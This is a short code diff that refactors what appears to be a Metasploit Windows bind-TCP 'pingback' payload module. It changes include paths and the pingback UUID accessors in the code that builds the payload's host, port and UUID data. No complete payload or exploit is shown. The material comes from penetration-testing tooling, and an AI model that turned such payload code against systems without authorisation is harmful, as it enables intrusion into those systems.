@@ -7,7 +7,6 @@ require 'msf/core/payload/pingback'
 require 'msf/core/handler/bind_tcp'
 require 'msf/core/payload/windows/block_api'
 require 'msf/base/sessions/pingback'
-require 'msf/base/sessions/pingback_options'
 module MetasploitModule
 
   CachedSize = 324
@@ -16,7 +15,7 @@ module MetasploitModule
   include Msf::Payload::Single
   include Msf::Payload::Pingback
   include Msf::Payload::Windows::BlockApi
-  include Msf::Sessions::PingbackOptions
+  include Msf::Payload::Pingback::Options
 
   def initialize(info = {})
     super(merge_info(info,
@@ -37,8 +36,8 @@ module MetasploitModule
       pingback_count = datastore['PingbackRetries']
       pingback_sleep = datastore['PingbackSleep']
       encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
-      pingback_uuid ||= generate_pingback_uuid
-      uuid_as_db = "0x" + pingback_uuid.to_s.gsub("-", "").chars.each_slice(2).map(&:join).join(",0x")
+      self.pingback_uuid ||= self.generate_pingback_uuid
+      uuid_as_db = "0x" + self.pingback_uuid.to_s.gsub("-", "").chars.each_slice(2).map(&:join).join(",0x")
       addr_fam      = 2
       sockaddr_size = 16
 
